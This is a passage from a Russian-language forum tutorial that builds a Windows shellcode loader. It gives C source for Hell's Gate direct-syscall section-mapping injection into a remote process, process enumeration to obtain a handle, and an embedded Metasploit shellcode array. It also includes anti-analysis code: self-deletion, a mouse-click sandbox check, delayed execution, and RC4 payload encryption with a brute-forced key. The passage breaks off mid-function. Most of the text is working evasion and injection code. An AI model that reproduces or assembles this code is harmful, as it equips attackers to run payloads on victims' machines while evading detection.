    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtClose))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateThreadEx))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtWaitForSingleObject))
        return FALSE;

    return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

        HANDLE          hSection          = NULL;
        HANDLE          hThread           = NULL;
        PVOID           pLocalAddress     = NULL,
                        pRemoteAddress    = NULL,
                        pExecAddress      = NULL;
        NTSTATUS        STATUS            = NULL;
        SIZE_T          sViewSize         = NULL;
        LARGE_INTEGER   MaximumSize       = {
              .HighPart = 0,
              .LowPart = sPayloadSize
        };

        DWORD           dwLocalFlag       = PAGE_READWRITE;

    //--------------------------------------------------------------------------
    // Выделение локальной карты
    HellsGate(g_Sys.NtCreateSection.wSystemCall);
    if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if (bLocal) {
        dwLocalFlag = PAGE_EXECUTE_READWRITE;
    }

    HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, dwLocalFlag)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [L] не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Локальная память выделена по адресу: 0x%p размером : %d \n&quot;, pLocalAddress, sViewSize);

    //--------------------------------------------------------------------------
    // Запись Payload
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать Payload ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Payload скопирован с 0x%p по 0x%p \n&quot;, pPayload, pLocalAddress);

    //--------------------------------------------------------------------------
        // Выделение удаленной карты
        if (!bLocal) {

          HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
          if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
            printf(&quot;[!] NtMapViewOfSection [R] не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
          }

          printf(&quot;[+] Удаленная память выделена по адресу: 0x%p размером : %d \n&quot;, pRemoteAddress, sViewSize);

        }

    //--------------------------------------------------------------------------
    // Выполнение Payload через создание потока
    pExecAddress = pRemoteAddress;
    if (bLocal) {
        pExecAddress = pLocalAddress;
    }
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выполнить Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Запуск потока с начальным адресом 0x%p ... &quot;, pExecAddress);
    HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Готово \n&quot;);
    printf(&quot;\t[+] Создан поток с идентификатором : %d \n&quot;, GetThreadId(hThread));

    //--------------------------------------------------------------------------
    // Ожидание завершения потока
    HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
    if ((STATUS = HellDescent(hThread, FALSE, NULL)) != 0) {
        printf(&quot;[!] NtWaitForSingleObject не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Отмена отображения локального вида
    HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора раздела
    HellsGate(g_Sys.NtClose.wSystemCall);
    if ((STATUS = HellDescent(hSection)) != 0) {
        printf(&quot;[!] NtClose не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Перечисление процессов</b><br />
<br />
Для создания полного модуля внедрения в процесс необходимо использовать системный вызов NtQuerySystemInformation для получения дескриптора целевого процесса, как описано в модуле Process Enumeration - NtQuerySystemInformation.<br />
<br />
Использование нового системного вызова потребует обновления структуры VX_TABLE, чтобы включить еще один элемент, VX_TABLE_ENTRY.<br />
NtQuerySystemInformation, который будет инициализирован функцией InitializeSyscalls. Кроме того, используйте программу Hasher для вычисления хеш-значения для строки &quot;NtQuerySystemInformation&quot;.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {

    ULONG                        uReturnLen1         = NULL,
                                uReturnLen2         = NULL;
    PSYSTEM_PROCESS_INFORMATION  SystemProcInfo     = NULL;
    PVOID                        pValueToFree     = NULL;
    NTSTATUS                    STATUS             = NULL;

    // Это неудача со статусом = STATUS_INFO_LENGTH_MISMATCH, но это нормально, потому что нам нужно узнать, сколько нужно выделить (uReturnLen1)
    HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
    HellDescent(SystemProcessInformation, NULL, NULL, &amp;uReturnLen1);

    // Выделение достаточного буфера для возвращаемого массива структур SYSTEM_PROCESS_INFORMATION
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL) {
        return FALSE;
    }

    // Поскольку мы будем изменять &#039;SystemProcInfo&#039;, мы сохраняем его начальное значение перед циклом while, чтобы позже освободить его
    pValueToFree = SystemProcInfo;

    // Вызов NtQuerySystemInformation с правильными аргументами, вывод будет сохранен в &#039;SystemProcInfo&#039;
    HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
    STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &amp;uReturnLen2);
    if (STATUS != 0x0) {
        printf(&quot;[!] NtQuerySystemInformation не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    while (TRUE) {

        // Проверка размера имени процесса
        // Сравнение имени процесса с целью
        if (SystemProcInfo-&gt;ImageName.Length &amp;&amp; HASHW(SystemProcInfo-&gt;ImageName.Buffer) == HASHW(szProcName)) {
            // Открытие дескриптора целевого процесса и сохранение его, затем выход
            *pdwPid = (DWORD)SystemProcInfo-&gt;UniqueProcessId;
            *phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo-&gt;UniqueProcessId);
            break;
        }

        // Если NextEntryOffset равен 0, мы достигли конца массива
        if (!SystemProcInfo-&gt;NextEntryOffset)
            break;

        // Переход к следующему элементу в массиве
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo-&gt;NextEntryOffset);
    }

    // Освобождение памяти, используя начальный адрес
    HeapFree(GetProcessHeap(), 0, pValueToFree);

    // Проверка, получен ли дескриптор целевого процесса
    if (*pdwPid == NULL || *phProcess == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Основная функция</b><br />
<br />
Для тестирования кода создайте main.c, который будет содержать точку входа загрузчика, а также обычную полезную нагрузку Msfvenom calc.<br />
<br />
<b>Объяснение что делается в основной функции:</b><br />
<br />
Функция InitializeSyscalls - это первая вызываемая функция.<br />
Все остальные функции зависят от нее для инициализации структуры системных вызовов.<br />
Если TARGET_PROCESS определен, вызывается функция GetRemoteProcessHandle для получения дескриптора целевого процесса и передачи его вывода в RemoteMappingInjectionViaSyscalls. Если TARGET_PROCESS не определен, код непосредственно вызывает RemoteMappingInjectionViaSyscalls с псевдо-значением для дескриптора локального процесса (1), указывая внедрить полезную нагрузку локально.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;// комментарий для внедрения в локальный процесс
//
#define TARGET_PROCESS    L&quot;Notepad.exe&quot;// x64 calc metasploit
unsigned char Payload [] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x20, 0x2F, 0x69, 0x20, 0x2F,
    0x74, 0x31, 0x20, 0x2F, 0x64, 0x65, 0x6C, 0x20, 0x22, 0x25, 0x50, 0x52,
    0x4F, 0x47, 0x52, 0x41, 0x4D, 0x46, 0x49, 0x4C, 0x45, 0x25, 0x22, 0x00,
    0x00
};
// Вторичный поток
DWORD WINAPI MainThread(LPVOID lpParam) {
    UNREFERENCED_PARAMETER(lpParam);

    printf(&quot;\n\n[~] Запущено \n&quot;);

    // Инициализация системных вызовов
    if (!InitializeSyscalls()) {
        printf(&quot;[!] Не удалось инициализировать системные вызовы \n&quot;);
        return FALSE;
    }

    // Получение дескриптора целевого процесса
    HANDLE hProcess = NULL;
    DWORD dwPid = NULL;
    if (TARGET_PROCESS) {
        if (!GetRemoteProcessHandle(TARGET_PROCESS, &amp;dwPid, &amp;hProcess)) {
            printf(&quot;[!] Не удалось получить дескриптор целевого процесса \n&quot;);
            return FALSE;
        }
        printf(&quot;[+] Дескриптор целевого процесса получен : %d \n&quot;, dwPid);
    }
    else {
        hProcess = (HANDLE)1; // Псевдо-дескриптор для локальной инъекции
    }

    // Выполнение внедрения
    if (!RemoteMappingInjectionViaSyscalls(hProcess, Payload, sizeof(Payload), !TARGET_PROCESS)) {
        printf(&quot;[!] Внедрение Payload не удалось \n&quot;);
        return FALSE;
    }

    printf(&quot;[+] Выполнено \n&quot;);

    // Ожидание завершения
    if (TARGET_PROCESS) {
        WaitForSingleObject(hProcess, INFINITE);
    }

    return TRUE;
}
int main() {
    HANDLE hThread = CreateThread(NULL, 0, MainThread, NULL, 0, NULL);
    if (hThread == NULL) {
        printf(&quot;[!] Не удалось создать поток \n&quot;);
        return 1;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 0;
}</code></pre>
	</div>
</div><br />
<b>Результаты:<br />
<br />
Удаленная инъекция</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788183250.png"
		data-src="https://osint42.org/attachments/1746788183250-png.263/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788183250-png.263/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788183250.png"
			title="1746788183250.png"
			width="1656" height="743" loading="lazy" />
	</div><br />
<br />
<br />
<b>Локальная инъекция</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788190362.png"
		data-src="https://osint42.org/attachments/1746788190362-png.264/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788190362-png.264/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788190362.png"
			title="1746788190362.png"
			width="1729" height="756" loading="lazy" />
	</div><br />
<br />
<b>Функции антианализа </b><br />
<br />
Для добавления функций антианализа создайте новый файл с именем AntiAnalysis.c. Этот файл будет содержать следующую функциональность:<br />
<ol>
<li data-xf-list-type="ol">Функция самоудаления.</li>
<li data-xf-list-type="ol">Функция мониторинга щелчков мыши.</li>
<li data-xf-list-type="ol">Функция задержки выполнения с использованием NtDelayExecution.</li>
</ol><b>AntiAnalysis.c</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

// Глобальные переменные для хука
HHOOK g_hMouseHook = NULL;
DWORD g_dwMouseClicks = NULL;

// Callback-функция, которая будет выполняться при каждом клике мыши
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        printf(&quot;[+] Запись клика мыши\n&quot;);
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

    MSG Msg = { 0 };

    // Установка хука
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW не удалось с ошибкой: %d\n&quot;, GetLastError());
    }

    // Обработка необработанных событий
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}

BOOL DeleteSelf() {

    WCHAR szPath[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO Delete = { 0 };
    HANDLE hFile = INVALID_HANDLE_VALUE;
    PFILE_RENAME_INFO pRename = NULL;
    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
    SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

    // Выделение достаточного буфера для структуры &#039;FILE_RENAME_INFO&#039;
    pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        printf(&quot;[!] HeapAlloc не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }

    // Очистка структур
    ZeroMemory(szPath, sizeof(szPath));
    ZeroMemory(&amp;Delete, sizeof(FILE_DISPOSITION_INFO));

    // Маркировка файла для удаления (используется во втором вызове SetFileInformationByHandle)
    Delete.DeleteFile = TRUE;

    // Установка имени нового потока данных и его размера в структуре &#039;FILE_RENAME_INFO&#039;
    pRename-&gt;FileNameLength = sizeof(NewStream);
    RtlCopyMemory(pRename-&gt;FileName, NewStream, sizeof(NewStream));

    // Получение имени текущего файла
    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
        printf(&quot;[!] GetModuleFileNameW не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }

    // Открытие дескриптора текущего файла
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf(&quot;[!] CreateFileW [R] не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }

    wprintf(L&quot;[i] Переименование :$DATA в %s  ...&quot;, NEW_STREAM);

    // Переименование потока данных
    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
        printf(&quot;[!] SetFileInformationByHandle [R] не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }
    wprintf(L&quot;[+] ГОТОВО\n&quot;);

    CloseHandle(hFile);

    // Открытие нового дескриптора текущего файла
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE &amp;&amp; GetLastError() == ERROR_FILE_NOT_FOUND) {
        // Если файл уже удален
        return TRUE;
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        printf(&quot;[!] CreateFileW [D] не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }

    wprintf(L&quot;[i] УДАЛЕНИЕ ...&quot;);

    // Маркировка для удаления после закрытия дескриптора файла
    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &amp;Delete, sizeof(Delete))) {
        printf(&quot;[!] SetFileInformationByHandle [D] не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }
    wprintf(L&quot;[+] ГОТОВО\n&quot;);

    CloseHandle(hFile);

    // Освобождение выделенного буфера
    HeapFree(GetProcessHeap(), 0, pRename);

    return TRUE;
}

typedef NTSTATUS(NTAPI* fnNtDelayExecution)(
    BOOLEAN Alertable,
    PLARGE_INTEGER DelayInterval
    );

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

    // Преобразование минут в миллисекунды
    DWORD dwMilliSeconds = ftMinutes * 60000;
    LARGE_INTEGER DelayInterval = { 0 };
    LONGLONG Delay = NULL;
    NTSTATUS STATUS = NULL;
    fnNtDelayExecution pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtDelayExecution&quot;);
    DWORD _T0 = NULL;
    DWORD _T1 = NULL;

    printf(&quot;[i] Задержка выполнения с использованием \&quot;NtDelayExecution\&quot; на %0.3d секунд&quot;, (dwMilliSeconds / 1000));

    // Преобразование из миллисекунд в 100-наносекундные интервалы времени (отрицательные)
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = -Delay;

    _T0 = GetTickCount64();

    // Пауза на &#039;dwMilliSeconds&#039; мс
    if ((STATUS = pNtDelayExecution(FALSE, &amp;DelayInterval)) != 0x00 &amp;&amp; STATUS != STATUS_TIMEOUT) {
        printf(&quot;[!] NtDelayExecution не удалось с ошибкой: 0x%0.8X\n&quot;, STATUS);
        return FALSE;
    }

    _T1 = GetTickCount64();

    // Если прошло по крайней мере &#039;dwMilliSeconds&#039; мс, то &#039;DelayExecutionVia_NtDE&#039; успешно, в противном случае неудача
    if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
        return FALSE;

    printf(&quot;\n\t&gt;&gt; _T1 - _T0 = %d\n&quot;, (DWORD)(_T1 - _T0));

    printf(&quot;[+] ГОТОВО\n&quot;);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Функция AntiAnalysis</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// using the &#039;extern&#039; keyword, because this variable is already defined in the &#039;Inject.c&#039; file
extern VX_TABLE g_Sys;

//...

BOOL AntiAnalysis(DWORD dwMilliSeconds) {

    HANDLE                    hThread            = NULL;
    NTSTATUS                STATUS            = NULL;
    LARGE_INTEGER            DelayInterval    = { 0 };
    FLOAT                    i                = 1;
    LONGLONG                Delay            = NULL;

    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = -Delay;

    // Self-deletion
    if (!DeleteSelf()) {
        // we dont care for the result - but you can change this if you want
    }

    // Try 10 times, after that return FALSE
    while (i &lt;= 10) {

        printf(&quot;[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n&quot;, (dwMilliSeconds / 1000));

        // Creating a thread that runs &#039;MouseClicksLogger&#039; function
        HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
        if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
            printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
        }

        // Waiting for the thread for &#039;dwMilliSeconds&#039;
        HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
        if ((STATUS = HellDescent(hThread, FALSE, &amp;DelayInterval)) != 0 &amp;&amp; STATUS != STATUS_TIMEOUT) {
            printf(&quot;[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
        }

        HellsGate(g_Sys.NtClose.wSystemCall);
        if ((STATUS = HellDescent(hThread)) != 0) {
            printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
        }

        // Unhooking
        if (g_hMouseHook &amp;&amp; !UnhookWindowsHookEx(g_hMouseHook)) {
            printf(&quot;[!] UnhookWindowsHookEx Failed With Error : %d \n&quot;, GetLastError());
            return FALSE;
        }

        // Delaying execution for specific amount of time
        if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
            return FALSE;

        // If the user clicked more than 5 times, we return true
        if (g_dwMouseClicks &gt; 5)
            return TRUE;

        // If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
        g_dwMouseClicks = NULL;

        // Increment &#039;i&#039;, so that next time &#039;DelayExecutionVia_NtDE&#039; will wait longer
        i++;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Кратко о функции AntiAnalysis: </b><br />
<br />
1. Она принимает dwMilliSeconds в качестве входного параметра, который представляет собой количество времени для мониторинга кликов мыши.<br />
<br />
2. Эта функция начинает с вызова DeleteSelf для удаления файла с диска.<br />
<br />
3. Затем запускается цикл while, который запускает MouseClicksLogger через новый поток и ждет его в течение времени, указанного в dwMilliSeconds.<br />
<br />
4. После истечения времени потока хуки удаляются, и выполнение программы задерживается на половину значения переменной i, где i представляет собой значение для задержки выполнения в минутах.<br />
<br />
5. Затем функция проверяет общее количество кликов мыши перед задержкой. Если их меньше 5, то глобальная переменная монитора кликов мыши, g_dwMouseClicks, сбрасывается, чтобы следующий цикл начал тестирование кликов мыши сначала.<br />
<br />
6. Увеличение переменной i заставляет последующую функцию DelayExecutionVia_NtDE ждать дольше, создавая способ задержки выполнения в песочнице.<br />
<br />
common.h<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Название нового потока данных
#define NEW_STREAM L&quot;:RuSfera&quot;

BOOL AntiAnalysis(DWORD dwMilliSeconds);</code></pre>
	</div>
</div><br />
Main.c:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (!AntiAnalysis(20000)) {
    printf(&quot;[!] Обнаружена виртуальная среда\n&quot;);
}</code></pre>
	</div>
</div><br />
Здесь 20000 представляет собой время мониторинга кликов мыши в миллисекундах.<br />
<br />
<b>NtDelayExecution через Hell&#039;s Gate </b><br />
<br />
Hell&#039;s Gate можно использовать для вызова NtDelayExecution, что требует обновления определения структуры VX_TABLE, расположенной в Common.h, и функции InitializeSyscalls для добавления элемента VX_TABLE_ENTRY NtDelayExecution и его инициализации. Программе Hasher также потребуется использование для вычисления хеша для системного вызова, как это было сделано в предыдущих шагах.<br />
<br />
<b>Результаты анти-анализа</b><br />
<br />
На следующем изображении показан результат выполнения функции AntiAnalysis во время выполнения.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788224836.png"
		data-src="https://osint42.org/attachments/1746788224836-png.265/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788224836-png.265/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788224836.png"
			title="1746788224836.png"
			width="1461" height="817" loading="lazy" />
	</div><br />
<br />
<b>Шифрование полезной нагрузки</b><br />
<br />
Для шифрования полезной нагрузки будет использован файл HellShell.exe. Команда, которая будет использоваться, - это .\HellShell.exe calc.bin rc4, где calc.bin - это файл с необработанной полезной нагрузкой. Зашифрованная полезная нагрузка заменит предыдущую нешифрованную полезную нагрузку в файле main.c.<br />
<br />
Кроме того, функция Rc4EncryptionViSystemFunc032, которая отвечает за расшифровку, будет сохранена в файле Inject.c.<br />
<br />
<b>Взлом методом перебора</b><br />
<br />
HellShell.exe генерирует следующий ключ.<br />
<br />
unsigned char Rc4Key[] = { 0x61, 0x1A, 0xA0, 0xAA, 0xA7, 0x92, 0x9F, 0xBA, 0x8F, 0xCE, 0x4C, 0xD8, 0x11, 0xFA, 0xED, 0xB9 };<br />
<br />
Ключ будет зашифрован, а затем расшифрован с использованием метода перебора. Сначала ключ нужно зашифровать. Это будет сделано с помощью нового проекта.<br />
Этот новый проект предоставлен в коде данного модуля и называется KeyGuard2.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788237738.png"
		data-src="https://osint42.org/attachments/1746788237738-png.266/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788237738-png.266/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788237738.png"
			title="1746788237738.png"
			width="1515" height="1000" loading="lazy" />
	</div><br />
<br />
Функция Rc4EncryptionViSystemFunc032 будет обновлена, чтобы включить логику метода перебора. Эта функция будет вызываться из RemoteMappingInjectionViaSyscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // Результат SystemFunction032
    NTSTATUS STATUS = NULL;
    BYTE RealKey[KEY_SIZE] = { 0 };
    int b = 0;

    // Перебор ключа:
    while (1) {
